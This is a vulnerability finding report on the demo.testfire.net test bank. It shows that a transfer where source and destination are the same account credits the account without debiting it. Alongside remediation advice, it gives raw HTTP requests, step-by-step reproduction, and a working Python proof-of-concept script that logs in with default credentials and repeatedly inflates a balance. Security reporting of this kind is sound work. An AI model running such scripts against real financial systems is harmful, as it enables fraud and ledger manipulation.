# Self-transfer (fromAccount equal to toAccount) creates funds instead of being a no-op

**ID:** vuln-0014
**Severity:** MEDIUM
**Found:** 2026-09-20 21:48:39 UTC
**Target:** http://demo.testfire.net
**Endpoint:** /bank/doTransfer
**CWE:** CWE-682
**CVSS:** 6.5
**Confidence:** High
**Fix Effort:** Low

## Description

The fund-transfer operation credits the destination account but does not debit the source when both accounts are the same. Because the server does not enforce that `fromAccount` differs from `toAccount` (only the browser JavaScript does), an attacker can repeatedly "transfer" an amount to the same account and increase its balance without any source of funds. This affects both the web endpoint `POST /bank/doTransfer` and the REST endpoint `POST /api/transfer`.

## Evidence

Web endpoint — three consecutive self-transfers of `$100` on account `800023` (balance read via `GET /api/account/800023`):

```text
POST /bank/doTransfer  fromAccount=800023 toAccount=800023 transferAmount=100
-> "100.0 was successfully transferred from Account 800023 into Account 800023 ..."
   800023: $15.00 -> $115.00   (+100)
-> "100.0 was successfully transferred ..."   800023: $115.00 -> $215.00   (+100)
-> "100.0 was successfully transferred ..."    800023: $215.00 -> $315.00   (+100)
```

REST endpoint — self-transfer of `$50` on account `800023`:

```http
POST /api/transfer HTTP/1.1
Authorization: Bearer <jsmith token>
Content-Type: application/json

{"toAccount":"800023","fromAccount":"800023","transferAmount":"50"}
```

```http
HTTP/1.1 200 OK
{"success":"50.0 was successfully transferred from Account 800023 into Account 800023 ..."}
```

```text
800023: $322.00 -> $372.00   (+50)
```

Control (normal transfer between two distinct accounts is conserved):

```text
POST /bank/doTransfer  fromAccount=800014 toAccount=800023 transferAmount=7
   800014: -$1106.99 -> -$1113.99  (-7)    800023: $315.00 -> $322.00  (+7)
```

## Impact

An authenticated user can mint unlimited funds into any account they can name as both source and destination, effectively setting the balance to an arbitrary value. This breaks conservation of value in the ledger: money is created from nothing, transactions are recorded as successful, and the resulting balance is durable and visible through all account views. It undermines the integrity of every downstream financial computation.

## Counterevidence

Checked for a control that would make this safe: (1) the only validation observed is client-side JavaScript in `transfer.jsp` that blocks `from==to` and `amt>0` — it does not execute for a direct HTTP request and was bypassed; (2) confirmed the server returned a success message and the balance actually increased by the full amount, so this is not a display artifact — re-read via the independent `GET /api/account/{no}` endpoint; (3) verified a normal transfer between two different accounts is conserved (source -7, destination +7), so the extra credit is specific to `from==to`; (4) reproduced three times consecutively on the web endpoint and once on the API. No server-side `from!=to` check, WAF, or compensating control exists. Demo (synthetic) data limits real-world loss, but the conservation-of-value invariant is genuinely broken.

## What Would Change This Severity

Because the defect lets an authenticated user arbitrarily inflate their own balance, confirmation that this path handles real value would raise severity to critical; if the transfer logic were made atomic and re-checked with a `from != to` guard the issue disappears.

## Technical Analysis

The transfer routine reads the source and destination balances and writes `source = source - amount` and `destination = destination + amount`. When both identifiers refer to the same account row, the two writes target one row and the final value reflects the credit (`+amount`) rather than a net zero, so the balance increases by the full amount with no corresponding debit. The only guard against `fromAccount == toAccount` lives in client-side JavaScript (`transfer.jsp` `confirminput`: "From Account and To Account fields cannot be the same"); the server performs no such check, so a direct HTTP request with identical source and destination is accepted. The same backend is shared by the web `TransferServlet` and the REST `/api/transfer` handler, so both are affected.

## Proof of Concept

1. Authenticate as `jsmith` via `POST /doLogin` (web) or `POST /api/login` (API).
2. Pick any account the user can reference, e.g. `800023`, and record its balance via `GET /api/account/800023`.
3. Send a transfer where the source and destination are the SAME account: `POST /bank/doTransfer` with `fromAccount=800023&toAccount=800023&transferAmount=100` (or `POST /api/transfer` with the equivalent JSON body).
4. Observe HTTP 200 and a success message.
5. Re-read the balance: it increased by the full `transferAmount` with no corresponding debit.
6. Repeat step 3 to increase the balance arbitrarily (three repetitions added $300 in testing).

```python
import requests, re

BASE = "http://demo.testfire.net"
tok = requests.post(BASE + "/api/login",
                    json={"username": "jsmith", "password": "demo1234"},
                    timeout=20).json()["Authorization"]
H = {"Authorization": "Bearer " + tok, "Content-Type": "application/json"}

def bal(acct):
    t = requests.get(BASE + "/api/account/" + acct, headers=H, timeout=20).text
    return re.search(r'"balance":"([^"]+)"', t).group(1)

# self-transfer: fromAccount == toAccount credits without debiting
for _ in range(3):
    r = requests.post(BASE + "/api/transfer", headers=H,
                      json={"toAccount": "800023", "fromAccount": "800023",
                            "transferAmount": "100"}, timeout=20)
    print(r.status_code, r.text)      # 200 {"success":"100.0 was successfully transferred ..."}
    print("800023 balance:", bal("800023"))   # increases by 100 each time
```

## Remediation

Enforce on the server (for both the REST API and the web servlet) that `fromAccount` and `toAccount` are different accounts, rejecting the request otherwise — do not rely on the browser JavaScript check. More generally, implement the transfer as a single atomic transaction that debits the source and credits the destination using a conservation-preserving update (e.g., conditional `UPDATE ... WHERE balance >= amount` and `SET balance = balance - amount` / `balance + amount`), so a self-referential move cannot net-credit an account. Add a reconciliation/invariant check that the sum of balances is unchanged by a transfer.

## Assumptions

Assumes an authenticated account (jsmith/demo1234, documented defaults). No special role required; the browser-side guard is the only thing preventing this via the UI, and it is trivially bypassed by scripting the endpoint directly.
